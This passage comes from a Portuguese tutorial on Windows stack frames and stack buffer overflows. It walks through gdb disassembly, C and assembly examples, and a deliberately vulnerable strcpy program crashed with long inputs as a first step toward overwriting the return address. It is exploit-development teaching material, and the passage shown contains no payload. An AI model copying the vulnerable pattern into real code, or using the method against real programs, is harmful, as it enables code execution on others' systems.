HWND hWnd,         // handle do dono da janela
LPCTSTR lpText,    // Endereco do texto 
LPCTSTR lpCaption, // Endereco do titulo 
UINT uType         // Estilo da caixa de mensagem

);


MessageBoxA no stack

              
                 +==============+
                 |     64       |      ---&gt; Primeiro dado empilhado
                 |--------------| 
                 |   &quot;title&quot;    |      ---&gt; Segundo dado empilhado
                 |--------------|
                 |   &quot;text&quot;     |      ---&gt; Terceiro dado empilhado
                 |--------------|
                 |   NULL (0)   |      ---&gt; Quarto dado empilhado
                 +--------------+
 
         call [Endereco da funcao MessageBoxA]


Quando a funcao MessageBoxA e chamada (call) ela pegara primeiramente o ultimo dado 
empilhado, no nosso caso o 0 (dono da janela), depois o texto da  caixa de dialogo, 
titulo da janela e o estilo de  janela (64), assim exibindo a caixa de dialogo pro-
priamente dita. Em asm (Assembly) seria essa uma representacao ideal:


(...) 

      1 -  PUSH 64             ; Empurra 64 (Estilo de janela) no topo do stack
      2 -  PUSH title          ; Titulo da janela.
      3 -  PUSH text           ; Empurra o texto no topo do stack.
      4 -  PUSH 0              ; Dono da janela.
        
        call 0x77D46476        ; Chama a funcao armazenada neste endereco.

(...)


Quando a funcao e chamada ela pegara o ultimo valor empilhado, 4, depois 3, 2 e 1 e
assim consequentemente lhe apresentando a caixa de dialogo.


ExitProcess 

(...)

        PUSH 0             ; Empurra o status de saida sobre o topo do stack.
        call 0x77E698FD    ; Chama a funcao que termina a execucao do programa.


Quando a instrucao call e chamada o endereco da proxima instrucao e posto
no topo da stack. O exemplo que segue sera muito util para seu aprendiza-
do. Escrevi esse programa em assembly e compilei o mesmo com o fasm.


-- cut -- 

 format PE GUI 4.0

 include &quot;c:\fasmw16727 (windows)\include\WIN32AX.INC&quot;

 start:           ; Marca o inicio dos codigos

 jmp hey          ; Pula para o rotulo hey

 chama:
 pop ebx

 invoke MessageBox,0,ebx, &quot;Title&quot;,0
 invoke exit,0

 hey:
 call chama
 nome db &#039;6_Bl4ck9_f0x6&#039;,0
 
; Importa as API&#039;s que contem as funcoes utilizadas no programa

 data import

  library kernel32, &#039;KERNEL32.DLL&#039;, user32, &#039;user32.dll&#039;

; Importa as funcoes contidas nessas API&#039;s

  import kernel32, exit, &#039;ExitProcess&#039;
  import user32, MessageBox, &#039;MessageBoxA&#039;

 end data

-- cut -- 


Comentarei o que e realmente importante.

 call chama
 nome db &#039;6_Bl4ck9_f0x6&#039;,0

Veja que a instrucao call chama o rotulo &quot;chama&quot;, ou seja, o fluxo do programa 
segue desse ponto em diante, a &#039;proxima instrucao&#039; apos a chamada do  rotulo e 
entao posta no topo da stack, ou seja, a variavel &#039;nome&#039; que armazena a string 
&quot;6_Bl4ck9_f0x6&quot; e empilhada. O db ali esta marcando que esta variavel armazena 
caracteres, e como se fosse uma &#039;char&#039; em C.

 pop ebx

Retira os dados empilhados sobre a stack (A &quot;string&quot;) e copia os mesmos para o 
registrador ebx. 
 
 invoke MessageBox,0,ebx, &quot;Title&quot;,0
 invoke exit,0

Agora veja que interessante, repare que o segundo argumento da funcao MessageBox
e justamente o registrador &#039;ebx&#039;, que esta armazenando os dados anteriormente em-
pilhados, ou seja a string. O invoke chama uma funcao, nesse sao chamadas as fun-
coes MessageBox e ExitProcess (representado por &#039;exit&#039; no codigo).


Vamos manipular o gdb agora:


C:\Documents and Settings\David&gt;gdb msg.exe -q
(gdb) list
1       #include &lt;stdio.h&gt;
2       #include &lt;stdlib.h&gt;
3       #include &lt;windows.h&gt;
4
5       main (){
6
7          MessageBoxA (0, &quot;Text&quot;, &quot;Title&quot;, 64);
8          exit (0);
9       }
10
(gdb) q

C:\Documents and Settings\David&gt;


Como voce ja sabe o comando &quot;list&quot; nos mostra os symbols do programa. Caso queira 
visualizar mais linhas de codigo no seu programa, basta que repita o comando list,
se quiser voltar para as  primeiras linhas digite list 0. Repare que  cada  symbol 
possui um numero de identificacao, que pode ser visto a sua esquerda. Disassembla-
remos agora a funcao principal (&#039;main()&#039;). 


C:\Documents and Settings\David&gt;gdb msg.exe -q
(gdb) disassemble main
Dump of assembler code for function main:
0x401290 &lt;main&gt;:        push   %ebp
0x401291 &lt;main+1&gt;:      mov    %esp,%ebp
0x401293 &lt;main+3&gt;:      sub    $0x18,%esp
0x401296 &lt;main+6&gt;:      and    $0xfffffff0,%esp
0x401299 &lt;main+9&gt;:      mov    $0x0,%eax
0x40129e &lt;main+14&gt;:     add    $0xf,%eax
0x4012a1 &lt;main+17&gt;:     add    $0xf,%eax
0x4012a4 &lt;main+20&gt;:     shr    $0x4,%eax
0x4012a7 &lt;main+23&gt;:     shl    $0x4,%eax
0x4012aa &lt;main+26&gt;:     mov    %eax,0xfffffffc(%ebp)
0x4012ad &lt;main+29&gt;:     mov    0xfffffffc(%ebp),%eax
0x4012b0 &lt;main+32&gt;:     call   0x401730 &lt;_alloca&gt;
0x4012b5 &lt;main+37&gt;:     call   0x4013d0 &lt;__main&gt;
0x4012ba &lt;main+42&gt;:     movl   $0x40,0xc(%esp,1)           &lt;-- Estilo de janela
0x4012c2 &lt;main+50&gt;:     movl   $0x403000,0x8(%esp,1)       &lt;-- Titulo
0x4012ca &lt;main+58&gt;:     movl   $0x403006,0x4(%esp,1)       &lt;-- Texto 
0x4012d2 &lt;main+66&gt;:     movl   $0x0,(%esp,1)               &lt;-- Dono da janela
0x4012d9 &lt;main+73&gt;:     call   0x401880 &lt;MessageBoxA@16&gt;   &lt;-- Chamada da funcao
0x4012de &lt;main+78&gt;:     sub    $0x10,%esp
0x4012e1 &lt;main+81&gt;:     movl   $0x0,(%esp,1)
0x4012e8 &lt;main+88&gt;:     call   0x401820 &lt;exit&gt;
End of assembler dump.
(gdb) q

C:\Documents and Settings\David&gt;


O leitor astuto percebera que existe 0x40 ao inves de 64. Isso se deve ao fato de
que o processador trabalha com a base numerica hexadecimal. 0x40 e  equivalente a 
64 em decimal.

(...)

0x4012ba &lt;main+42&gt;:     movl   $0x40,0xc(%esp,1)           &lt;-- Estilo de janela
0x4012c2 &lt;main+50&gt;:     movl   $0x403000,0x8(%esp,1)       &lt;-- Titulo
0x4012ca &lt;main+58&gt;:     movl   $0x403006,0x4(%esp,1)       &lt;-- Texto 
0x4012d2 &lt;main+66&gt;:     movl   $0x0,(%esp,1)               &lt;-- Dono da janela
0x4012d9 &lt;main+73&gt;:     call   0x401880 &lt;MessageBoxA@16&gt;   &lt;-- Chamada da funcao

(...)


Como voce pode ver o estilo de janela e inserido primeiramente sobre a stack, seguido
do endereco de memoria onde esta localizado o titulo da caixa de  mensagem, texto da
mensagem e logo apos o dono da janela. Na instrucao de endereco 0x4012d9 a instrucao
call chamara o endereco 0x401880 no qual &quot;executara&quot; a funcao MessageBoxA, que pega-
ra seus parametros previamente empilhados sobre a stack. Agora, duas  resalvas devem
ser feitas: Esta sintaxe e a &#039;AT&amp;T&#039;, ou seja, a origem e o lado esquerdo e o destino
o lado direito. A outra ressalva e sobre a &quot;nao utilizacao&quot; na  instrucao PUSH, para
empilhamento de dados sobre a stack, ao contrario disto, os dados sao movidos para o
stack pointer (apontado por esp) com a instrucao  movl (move long) e com o metodo de
enderecamento indexed. Para ver as strings armazenadas nos enderecos de  memoria co-
piados para a stack, use o /s como sempre ;) 


(gdb) x/s 0x403000
0x403000 &lt;_data_end__+4032&gt;:     &quot;Title&quot;
(gdb) x/s 0x403000+6
0x403006 &lt;_data_end__+4038&gt;:     &quot;Text&quot;
(gdb) q


Com o sinal de + seguido do numero 6 estou  dizendo que desejo que o gdb me mostre
a string armazenada 6 bytes apos o endereco 0x403000, pois e onde se  inicia o ou-
tro vetor de caracteres. Tambem poderia ter utilizado a  sintaxe x/s 0x403006, di-
retamente. A stack no windows esta armazenada em enderecos baixos e ela  possui um 
esquema de enderecamento que cosiste em crescer de cima para baixo e de &#039;4&#039; em &#039;4&#039; 
bytes. Extended Stack Pointer (esp) = 0006FFC4  &lt;---
 

                        +=====================+
                        | Endereco | Valor    || 
                        +=====================||
                        |                     ||
                        | 0006FFC4  77E714C7  ||
                        | 0006FFC8  FFFFFFFF  ||
                        | 0006FFCC  77F5166A  ||
                        | 0006FFD0  7FFDF000  ||
                        | 0006FFD4  F0909CF0  ||
                        | 0006FFD8  0006FFC8  || 
                        |                     ||
                        +======================+


Instrucoes que manipulam a stack

PUSH $5       ; Empurra o valor 5 na stack
PUSH $9       ; Empurra o valor 9 na stack
PUSH $10      ; Empurra o valor 10
PUSH $11      ; Empurra o valor 11

Veja a pilha logo apos essas instrucoes 


                        +=====================+
                        | Endereco | Valor    | 
                        +=====================+
           4   &lt;-----&gt;    0006FFB4 | 0000000B    &lt;-----&gt; 11
           8   &lt;-----&gt;    0006FFB8 | 0000000A    &lt;-----&gt; 10
           C   &lt;-----&gt;    0006FFBC | 00000009    &lt;-----&gt;  9
           0   &lt;-----&gt;    0006FFC0 | 00000005    &lt;-----&gt;  5
                        | 0006FFC4 | 77E714C7 |
                        | 0006FFC8 | FFFFFFFF |
                        | 0006FFCC | 77F5166A |
                        | 0006FFD0 | 7FFDF000 |
                        | 0006FFD4 | F0909CF0 |
                        | 0006FFD8 | 0006FFC8 |
                        +=====================+
                        |  esp = 0x0006FFB4   |  
                        +=====================+


----- Capitulo 0x07


[=] + =========================================== + [=]
            ---=[  O stack frame ]=--- 
[=] + =========================================== + [=]


O &quot;termo&quot; &#039;stack frame&#039; nada  mais e que uma representacao de um dos estados de um 
programa montado na memoria em run-time - Tempo de execucao (claro). Veremos agora 
como e composto um stack frame de uma funcao dentro de um programa escrito em C.


C:\Documents and Settings\David&gt;gdb stack_frame.exe
GNU gdb 5.2.1
Copyright 2002 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type &quot;show copying&quot; to see the conditions.
There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.
This GDB was configured as &quot;i686-pc-mingw32&quot;...
(gdb) list
1       int function (int a, int b, int c){
2
3          char buffer[16];
4
5       }
6
7       main (){
8
9         function (1, 2, 3);
10
(gdb) list
11      }


Disassemblamos a funcao principal

(gdb) disass main
Dump of assembler code for function main:
0x401298 &lt;main&gt;:        push   %ebp
0x401299 &lt;main+1&gt;:      mov    %esp,%ebp
0x40129b &lt;main+3&gt;:      sub    $0x18,%esp
0x40129e &lt;main+6&gt;:      and    $0xfffffff0,%esp
0x4012a1 &lt;main+9&gt;:      mov    $0x0,%eax
0x4012a6 &lt;main+14&gt;:     add    $0xf,%eax
0x4012a9 &lt;main+17&gt;:     add    $0xf,%eax
0x4012ac &lt;main+20&gt;:     shr    $0x4,%eax
0x4012af &lt;main+23&gt;:     shl    $0x4,%eax
0x4012b2 &lt;main+26&gt;:     mov    %eax,0xfffffffc(%ebp)
0x4012b5 &lt;main+29&gt;:     mov    0xfffffffc(%ebp),%eax
0x4012b8 &lt;main+32&gt;:     call   0x401720 &lt;_alloca&gt;
0x4012bd &lt;main+37&gt;:     call   0x4013c0 &lt;__main&gt;
0x4012c2 &lt;main+42&gt;:     movl   $0x3,0x8(%esp,1)
0x4012ca &lt;main+50&gt;:     movl   $0x2,0x4(%esp,1)
0x4012d2 &lt;main+58&gt;:     movl   $0x1,(%esp,1)
0x4012d9 &lt;main+65&gt;:     call   0x401290 &lt;function&gt;         &lt;---- Chama a &quot;function&quot;
0x4012de &lt;main+70&gt;:     leave                              &lt;---- Endereco de retorno
0x4012df &lt;main+71&gt;:     ret
End of assembler dump.
(gdb) q



Veremos o stack frame da funcao &quot;function&quot; mostrada acima. 


(gdb) disassemble function
Dump of assembler code for function function:
0x401290 &lt;function&gt;:    push   %ebp
0x401291 &lt;function+1&gt;:  mov    %esp,%ebp
0x401293 &lt;function+3&gt;:  sub    $0x18,%esp
0x401296 &lt;function+6&gt;:  leave
0x401297 &lt;function+7&gt;:  ret
End of assembler dump.
(gdb) 


Neste exemplo utilizo o &quot;symbol&quot; function para representar  a parte do programa que
queremos ver disassemblada, ou seja, que queremos  ver as instrucoes, mas eu tambem
poderia utilizar  aquele endereco ao lado da instrucao call (disassemble 0x401290).
Repare bem nessas instrucoes, pois elas que serao as utilizadas para  a criacao e a 
destruicao do  stack frame. Para ser mais  especifico as tres  primeiras instrucoes 
criam o stack frame de uma funcao qualquer, as duas ultimas instrucoes por sua vez, 
destroem o stack frame de uma funcao. Vejamos agora um diagrama deste programa mon-
tado na memoria, ou seja, veremos seu stack frame.

       
---=[ Stack frame de uma funcao ]=---


      +----------------+
      |  buffer[0]     |   --&gt; Topo da stack (esp)
 ^    +----------------+
 |    |  buffer[1]     | 
 |    +----------------+
 |    |  buffer[2]     |
 |    +----------------+ 
 |    |  buffer[3]...  |
 |    +----------------+
 |    |                |
 |    | Dummy (8 bytes)|  
 |    |                | 
 |    +----------------+
 |    |     SFP        |   --&gt; Stack Frame Pointer
 |    |                |   --&gt; ebp - Extended Base pointer (referencia dados na stack)  
 |    +----------------+
 |    | RETURN ADDRESS |   --&gt; Endereco da proxima instrucao apos a chamada da funcao.
      +----------------+       
      |      a (1)     |  &lt; ------+
      +----------------+          |
      |      b (2)     |           &gt; Argumentos. function (int a, int b, int c);
      +----------------+          | 
      |      c (3)     |  &lt; ------+
      +----------------+


1 - Os argumentos da funcao sao alocados na memoria em ordem inversa. Nesse caso o 
    primeiro dado a ser inserido no stack frame e o valor da variavel c, depois b, 
    depois a.

2 - O endereco da proxima instrucao apos a chamada da funcao &quot;function&quot; e posto na 
    area &quot;Return address&quot; no stack frame, para o programa saber  onde ele  tem que 
    retornar apos o encerramento da funcao. 

3 - SFP - Stack Frame Pointer aponta para a base do stack frame. O ebp e o regis-
    trador utilizado para fazer referencias aos dados no stack frame.

4 - O espaco para as variaveis locais e reservado na stack/pilha. Lembrando que o 
    gcc tambem cria bytes de &quot;alinhamento&quot; na &quot;area buffer&quot; do stack frame.


==================================
= Se aprofundando no stack frame =
==================================


Como citei anteriormente, existe 5 instrucoes em assembly contidas em todas as funcoes 
de um programa, as 3 primeiras correspondem ao &quot;Prologo&quot;, a construcao do stack frame, 
as duas ultimas correspondem ao &quot;Epilogo&quot;, a destruicao do stack frame.


O Prologo 

[1] - 0x401290 &lt;function&gt;:    push   %ebp
[2] - 0x401291 &lt;function+1&gt;:  mov    %esp,%ebp
[3] - 0x401293 &lt;function+3&gt;:  sub    $0x18,%esp

O Epilogo

[4] - 0x401296 &lt;function+6&gt;:  leave
[5] - 0x401297 &lt;function+7&gt;:  ret


=====================
Definhando o prologo
=====================


1) - O stack frame (registrador ebp) e  empilhado. Como  ja citei, e atraves deste 
     registrador especial que o programa  faz  referencias aos dados das variaveis 
     locais de uma funcao, nesse caso da funcao &quot;function&quot;. 

2) - Como voce ja sabe, quando main chama uma funcao, o endereco da proxima instru-
     cao e posto na stack, disassemble a funcao main e veja a chamada a &quot;function&quot;. 

     0x4012d9 &lt;main+65&gt;:     call   0x401290 &lt;function&gt;

     Veja que o programa faz uma chamada exatamente ao endereco inicial desta fun-
     cao. E o endereco de memoria desta instrucao que e posto no topo da stack:

     0x4012de &lt;main+70&gt;:     leave
        
     Este endereco fica armazenado na parte RETURN Address do stack frame, ele e
     referenciado pelo registrador esp. Repare que o 0x&#039;4012de&#039; nao  passa de um 
     endereco de memoria virtual. O leitor astuto percebera que  houve uma copia 
     dos dados do esp (endereco de retorno) para ebp.

3) - E reservado um numero de bytes para alocar as variaveis locais. Nesse caso a 
     variavel local buffer reserva 16 bytes na  stack, a funcao sub subtrai o va-
     lor de um registrador, nesse caso o esp vai ser subtraido em 0x18 bytes assim 
     reservando 24 bytes em decimal p/ alocar as variaveis locais. Voce agora deve
     estar se perguntando: Como? Se 0x18 em hexadecimal  equivale a 24 em decimal? 
     A  resposta  e simples, o gcc reserva 8 bytes em  todas as funcoes de um pro-
     grama em C, o  conjunto desses bytes adicionais sao  chamados de dummy. Entao 
     ja temos o valor total:

     16 (buffer) + 8 (dummy) = 24 

     24 em decimal corresponde a 0x18 em hexadecimal. Vale  ressaltar que algumas 
     vezes o compilador gcc utiliza  &quot;alinhamentos extra&quot; na construcao do  stack 
     frame, mas nao foi o caso aqui. Comprove a existencia do dummy, compile esse 
     codigo:


-- cut -- 

main (){ }

-- cut -- 

Veja que apenas declaro a funcao principal e mais nada. Agora olhe o resultado:

(...)

(gdb) disass main
Dump of assembler code for function main:
0x401290 &lt;main&gt;:        push   %ebp
0x401291 &lt;main+1&gt;:      mov    %esp,%ebp
0x401293 &lt;main+3&gt;:      sub    $0x8,%esp     &lt;--- Veja o dummy aqui.

(...)

Perceba que apenas o espaco para o dummy da funcao principal foi reservado.


=====================
Definhando o epilogo 
=====================


4) - A instrucao leave e composta basicamente por duas instrucoes:

     MOV ebp, esp    &lt;----- Move o endereco de retorno anteriormente copiado para ebp
                            de volta para o esp. 

     POP ebp         &lt;----- Remove o SFP (ebp) do stack frame, assim destruindo-o.


5) - A instrucao ret move o endereco de retorno apontado por esp para o registrador 
     &#039;eip&#039; assim fazendo o programa  continuar  seu fluxo normal, executando a ins-
     trucao depois da chamada a funcao  &quot;function&quot;. Lembre-se que o registrador eip 
     aponta para a proxima  instrucao a ser executada.


Veja um diagrama do stack frame da funcao principal com dois argumento.


   main(int argc, char *argv[]){


           +----------------+ 
           |char buffer[28];|    &lt;--- O topo aponta para buffer[0]; 
           +----------------+
           | dummy (8 bytes)|    &lt;--- Dummy da funcao main
           +----------------+
           |   SFP (ebp)    |    &lt;--- Apontador de base
           +----------------+
           | RETURN ADDRESS |    &lt;--- Endereco de retorno de main.
           +----------------+
           |   int argc     |    &lt;----+
           +----------------+        /---&gt; Argumentos de main();
           |  char *argv[]  |    &lt;---+
           +----------------+      


=================================
+ Obtendo o endereco de retorno +
=================================


Nesta primeiro parte demonstrarei apenas uma das formas de obter o endereco
de retorno, no proximo paper falarei mais sobre metodos de  conseguir o RET
de alguma funcao. Primeiramente farei uma pequena aplicacao:


-- get_ret.c -- 

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void func (){

  printf (&quot;Esta funcao nao faz nada&quot;);

}

main (){

  func ();      // &lt;-- call 0x401290 &lt;func&gt;
  exit (0);     // &lt;-- Retorno no stack frame

}

-- cut -- 


Vamos obter o endereco de retorno apos a chamada da funcao func()


C:\&gt;gdb get_ret.exe -q
(gdb) disass main
Dump of assembler code for function main:
0x4012a4 &lt;main&gt;:        push   %ebp
0x4012a5 &lt;main+1&gt;:      mov    %esp,%ebp

(...) 

0x4012ce &lt;main+42&gt;:     call   0x401290 &lt;func&gt;
0x4012d3 &lt;main+47&gt;:     movl   $0x0,(%esp,1)     &lt;-- No stack frame (0x4012d3) 
0x4012da &lt;main+54&gt;:     call   0x401810 &lt;exit&gt;
End of assembler dump.


Vamos ver o stack frame no qual este RET sera inserido:


(gdb) disass func
Dump of assembler code for function func:
0x401290 &lt;func&gt;:        push   %ebp
0x401291 &lt;func+1&gt;:      mov    %esp,%ebp
0x401293 &lt;func+3&gt;:      sub    $0x8,%esp
0x401296 &lt;func+6&gt;:      movl   $0x403000,(%esp,1)
0x40129d &lt;func+13&gt;:     call   0x401820 &lt;printf&gt;
0x4012a2 &lt;func+18&gt;:     leave
0x4012a3 &lt;func+19&gt;:     ret
End of assembler dump.


Antes deste stack frame ser destruido marcaremos um breakpoint na ultima
instrucao, ou seja, a instrucao que comeca a  destruicao do stack frame, 
que e a &#039;leave&#039;, que esta localizada em &lt;func+18&gt;. 


(gdb) break *func+18
Breakpoint 1 at 0x4012a2: file C:/get_ret.c, line 8.


Iniciaremos o programa:


(gdb) r
Starting program: C:\get_ret.exe

Breakpoint 1, func () at C:/get_ret.c:8
8       }


Pegaremos agora o endereco de ebp e o do RET:


(gdb) x/x $ebp
0x22ff58:       0x0022ff78       &lt;--- Base do stack frame


Acima esta o endereco do FBP do stack frame. Utilizei o parametro &#039;x&#039; do &#039;x/&#039;  
seguido do registrador no qual desejo ver o valor em hexadecimal. 
 

(gdb) x/x $ebp+4
0x22ff5c:       0x004012d3       &lt;--- Endereco de retorno.


Essa sintaxe diz que desejo ver em hexadecimal 4 bytes depois do SFP.

(...)
+------------+
|   Dummy    | 
+------------+
| 0x0022ff78 |   &lt;-- FBP
+------------+
| 0x004012d3 |   &lt;-- RET
+------------+


Observe:

0x4012ce &lt;main+42&gt;:     call   0x401290 &lt;func&gt;
0x4012d3 &lt;main+47&gt;:     movl   $0x0,(%esp,1) 

  ^
  |
  +----- &gt; Veja que e este endereco que esta na area RET do stack frame de func.


Lembrando que voce tambem fara bom proveito deste paper se utilizar os 
exemplos aqui descritos, nos *nixes/linuxes ;)



----- Capitulo 0x0A


[=] + =========================================== + [=]
      ---=[  Como acontece o stack overflow ]=--- 
[=] + =========================================== + [=]


Acredito que isso seja de conhecimento de quase  todos  os leitores deste texto, que 
apesar de saberem como acontece, nao sabem como explorar. O Overflow acontece quando 
inserimos mais dado que um buffer pode suportar, ou seja, vamos supor que  um buffer 
suporte 16 bytes, se inserirmos 17 bytes esse ultimo byte vai &quot;sobrescrever&quot; o stack 
frame e vai alcancar o dummy. Se por um acaso nos inserirmos 16 + 8 + 1 esse  ultimo 
byte inserido por nos alcancara o FBP (ebp) que por sinal e composto por 4 bytes, ou
seja, esses dados &quot;ultrapassam&quot; o espaco reservado para o  buffer no  &#039;stack frame&#039;, 
alcancam o &#039;dummy&#039; que nesse caso e de 8 bytes e chegam no FBP. Acredito  que esteja 
ficando  mais claro para voce a cada minuto, amigo ;) Entao, pense comigo:  Se o en-
dereco de retorno armazena  o endero  da proxima  instrucao  depois da chamada a uma
funcao, e ja  que podemos sobrescrever o stack frame, entao podemos  inferir que po-
demos  inserir dados ate alcancarmos o endereco de retorno, e os dados que nos inse-
rimos que serao executados, certo? Exato. Veja esse exemplo:


-- I didn&#039;t see.c -- 

main (){
     
     char buffer2[21]=&quot;I didn&#039;t see nothing&quot;, buffer1[8];
     strcpy (buffer1, &quot;David_Destroyer&quot;);
     puts (buffer2);
}

-- cut -- 


Os dados sao empilhados da direita para esquerda nesse caso. Entao o buffer 1
sera empilhado, depois o buffer2. Repare que o buffer1 e capaz de  suportar 8
caracteres, mas a um problema neste  programa, perceba que estou copiando uma 
string de 15 bytes (David_Destroyer) para um buffer que suporta 8. O  que vai 
acontecer e o overflow, ou seja, os dados que nos inserimos sobre  o primeiro 
buffer vao sobrescrever o segundo.


123456789ABCDEF   &lt;--------[] 15 bytes
David_Destroyer
        |
        +-----------&gt; A partir daqui os dados estarao no buffer2


Veja que logo em seguida a copia dos dados, e imprimido o valor do buffer2.


C:\Documents and Settings\David&gt;&quot;I didn&#039;t see.exe&quot;
stroyer


Repare que os dados impressos nao sao os dados  que inicializei no &#039;buffer2&#039; 
(I didn&#039;t see nothing), mas sim o  resto dos  dados que nao foram suportados
pelo buffer1. Se inserirmos apenas 7 bytes no buffer1, ou menos, o  conteudo 
do segundo buffer sera impresso normalmente.  

-- nothing.c -- 

// nothing\0  &lt;-- 7 bytes + NULL byte

main (){
     
     char buffer2[21]=&quot;I didn&#039;t see nothing&quot;, buffer1[8];
     strcpy (buffer1, &quot;nothing&quot;);                     
     fprintf (stdout, &quot;%s&quot;, buffer2);
}

-- cut -- 


C:\Documents and Settings\David&gt;&quot;I didn&#039;t see.exe&quot;
I didn&#039;t see nothing


E se o buffer destino ao invez de 8, que e multiplo de 4, fosse 7, nao conse-
guiriamos fazer o programa mostrar os dados nao suportados porque os dados na 
pilha crescem de 4 em 4 bytes ;) Veja um melhor exemplo  dessa informacao que 
nos sera muito util em meu proximo paper (&quot;futuro proximo&quot;):


-- winki.c -- 

main (){
     
     char buffer2[21]=&quot;I didn&#039;t see nothing&quot;, buffer1[7];
     strcpy (buffer1, &quot;David_Destroyer&quot;);
     puts (buffer2);
}

-- cut -- 


Veja que o primeiro buffer e composto por 7 bytes, mas os dados que nos esta-
mos inserindo e multiplo de quatro bytes.

C:\Documents and Settings\David&gt;wink.exe
I didn&#039;t see nothing

Esse &quot;detalhe&quot; ficara para meu proximo texto,  no qual  demonstrarei mais exemplos
de exploracao pela heap do que o primeiro texto que escrevi[2]. E muito importante 
que voces saibam que a criacao de um dummy e de um alinhamento (criados pelos gcc)
no stack frame vai depender do tamanho do buffer  das variaveis  locais utilizadas  
no codigo do programa. Bem, primeiramente veremos exemplos  de overflow  para logo 
em  seguida eu poder entrar em detalhes com relacao a isso. 


-- programa1.c -- 

/*
* 
*   There&#039;s a bug in this code       
*
*/
 
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int overflow (char *string){

    char buffer[4];
    strcpy (buffer, string);
    puts (buffer);
    
}

int main (int argc, char *argv[]){

  if (argc != 2) exit (-1);

  overflow (argv[1]);

  return (0);
}


-- cut -- 


O que esse programa faz (como voce pode ver) e copiar o o primeiro parametro de li-
nha de comando e fazer uma chamada a funcao overflow, no qual recebera esse parame-
tro e armazenara o mesmo na variavel de lista de parametro &quot;string&quot; que por sua vez 
tera seu conteudo copiado para a variavel buffer, agora veja onde ocorrer a falha:


    char buffer[4];
    strcpy (buffer, string);


Repare que o buffer pode suportar 4 bytes, ou seja, e reservado para essa variavel
&#039;4&#039; bytes no stack frame da funcao overflow (no qual os  parametros passados a ela
serao alocados), abaixo vera que e copiado o conteudo da variavel string  (no qual 
armazena os parametros digitados por nos, na linha de comando) para esta variavel, 
mas a funcao strcpy() nao faz checagem alguma dos dados que serao  alocados na me-
moria (stack frame). O gcc reserva espaco para 4 bytes na  area &#039;buffer&#039; do  stack 
frame, ou seja, se inserirmos mais de 4 bytes esses  bytes  adicionais vao sobres-
crevendo os ponteiros no stack frame e se por  acaso  chegarem ao  retorno, o sis-
tema vai ter que retornar o que esta na area RET ADDR no stack frame, ou seja, ele
vai jogar para eip o endereco armazenado  na area RETURN ADDR, e assim  executando 
aquela instrucao (Como eu ja falei). Vejam sobre como injetar um endereco executa-
vel/valido na area &#039;RETURN ADDRESS&#039; nos proximos capitulos. &quot;Primeiramente&quot;  vamos 
ver como identificar o overflow e fazer alguns mapas da  memoria para cada  funcao 
que aqui sera debugada.


Execucao do programa1..:


C:\Documents and Settings\David&gt;programa1.exe AA
AA

C:\Documents and Settings\David&gt;programa1.exe AAA
AAA

C:\Documents and Settings\David&gt;programa1.exe AAAAAAAAAAAAA
AAAAAAAAAAAAA

C:\Documents and Settings\David&gt;


E atraves desta mensagem que podemos saber se o programa e vulneravel 
a overflow no windows (Segmentation fault):

    ------------------------------------------------------------
   |O programa1.exe encontrou um problema e precisa ser fechado.|
    ------------------------------------------------------------

Essa mensagem pode representar o overflow, como  tambem nao  pode. Se voce esta 
inserindo muito dados em buffers de alguns programas e voce cair nesta mensagem, 
a uma grande chance de voce ter descoberto  um bug/falha de stack overflow nesse  
programa. Repare que primeiramente insiro duas letras &#039;A&#039; na execucao do progra-
ma, ate ai tudo bem, o programa terminou normalmente, depois inseri  3 A&#039;s, tam-
bem nao houve problema  algum, pois o buffer suporta 4 bytes (3 + &#039;\0&#039;). Observe 
que na ultima execucao inseri:

AAAAAAAAAAAAA 
0123456789ABC
   |
   +---&gt; O buffer suporta dados ate aqui.

13 bytes no buffer, e nos foi apresentada a  mensagem anterior, ou seja, acaba-
mos de descobrir um bug! Veremos  agora  como explora-lo. Vamos ver os bytes do 
stack frame da funcao overflow e desenha-lo.


C:\Documents and Settings\David&gt;gdb programa1.exe -q
(gdb) disass main
Dump of assembler code for function main:
0x4012b5 &lt;main&gt;:        push   %ebp
0x4012b6 &lt;main+1&gt;:      mov    %esp,%ebp
0x4012b8 &lt;main+3&gt;:      sub    $0x8,%esp
0x4012bb &lt;main+6&gt;:      and    $0xfffffff0,%esp
0x4012be &lt;main+9&gt;:      mov    $0x0,%eax
0x4012c3 &lt;main+14&gt;:     add    $0xf,%eax
0x4012c6 &lt;main+17&gt;:     add    $0xf,%eax
0x4012c9 &lt;main+20&gt;:     shr    $0x4,%eax
0x4012cc &lt;main+23&gt;:     shl    $0x4,%eax
0x4012cf &lt;main+26&gt;:     mov    %eax,0xfffffffc(%ebp)
0x4012d2 &lt;main+29&gt;:     mov    0xfffffffc(%ebp),%eax
0x4012d5 &lt;main+32&gt;:     call   0x401750 &lt;_alloca&gt;
0x4012da &lt;main+37&gt;:     call   0x4013f0 &lt;__main&gt;
0x4012df &lt;main+42&gt;:     cmpl   $0x2,0x8(%ebp)
0x4012e3 &lt;main+46&gt;:     je     0x4012f1 &lt;main+60&gt;
0x4012e5 &lt;main+48&gt;:     movl   $0xffffffff,(%esp,1)
0x4012ec &lt;main+55&gt;:     call   0x401840 &lt;exit&gt;
0x4012f1 &lt;main+60&gt;:     mov    0xc(%ebp),%eax
0x4012f4 &lt;main+63&gt;:     add    $0x4,%eax
0x4012f7 &lt;main+66&gt;:     mov    (%eax),%eax
0x4012f9 &lt;main+68&gt;:     mov    %eax,(%esp,1)
0x4012fc &lt;main+71&gt;:     call   0x401290 &lt;overflow&gt;          &lt;----- Achamos a chamada
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
0x401301 &lt;main+76&gt;:     mov    $0x0,%eax
0x401306 &lt;main+81&gt;:     leave
0x401307 &lt;main+82&gt;:     ret
End of assembler dump.
(gdb) 


E nessa instrucao que a funcao overflow e chamada:

0x4012fc &lt;main+71&gt;:     call   0x401290 &lt;overflow&gt; 


Disassemblaremos a mesma:


(gdb) disass 0x401290
Dump of assembler code for function overflow:
0x401290 &lt;overflow&gt;:    push   %ebp                    
0x401291 &lt;overflow+1&gt;:  mov    %esp,%ebp               
0x401293 &lt;overflow+3&gt;:  sub    $0x18,%esp              
0x401296 &lt;overflow+6&gt;:  mov    0x8(%ebp),%eax          
0x401299 &lt;overflow+9&gt;:  mov    %eax,0x4(%esp,1)        
